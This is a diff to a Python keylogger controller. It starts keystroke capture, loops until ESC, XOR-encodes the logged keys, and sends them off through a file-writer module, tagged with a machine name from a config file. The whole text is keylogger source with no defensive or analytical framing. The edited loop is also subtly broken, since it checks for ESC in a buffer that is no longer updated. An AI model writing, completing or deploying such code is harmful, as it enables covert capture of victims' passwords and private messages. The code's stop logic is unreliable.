@@ -1,32 +1,48 @@
 import datetime
 import time
+import json
+import os
 from KeyloggerService import service
 from Encryption_file import encryptor
 from FileWriter import file_writer
+
 class KeyLoggerManager:
     def __init__(self):
         self.buffer = []
         self.to_encrypt = []
+        self.config = self.load_config()
 
+    def load_config(self):
+
+        with open("config.json", "r") as f:
+            return json.load(f)
 
     def manager(self):
-
+        new_keys = -1
         service.start_logging()
         end = False
         while not end:
-            self.buffer = service.get_logged_keys()
-            if "<ESC>" in self.buffer:
+            new_keys = service.get_logged_keys()
+            if new_keys and "<ESC>" in self.buffer:
                 end = True
             time.sleep(5)
-        timestamp = str(datetime.datetime.now())
-        service.stop_logging()
-        for char in self.buffer:
-            self.to_encrypt.append(encryptor.ascii_xor(char))
-        content = {timestamp: self.to_encrypt}
-        file_writer.send_data(content,"yosi")
+        if new_keys:
+            timestamp = str(datetime.datetime.now())
 
-a= KeyLoggerManager()
-a.manager()
+            encrypted_keys = []
+            for char in new_keys:
+                encrypted_keys.append(encryptor.ascii_xor(char))
+
+            content = {timestamp: encrypted_keys}
+            machine_name = self.config.get("machine_name", "unknown")
+            file_writer.send_data(content, machine_name)
+
+            service.logged_keys = []
 
 
+
+if __name__ == "__main__":
+    print("keylogger start to run, for stop press ESC")
+    manager = KeyLoggerManager()
+    manager.manager()
 
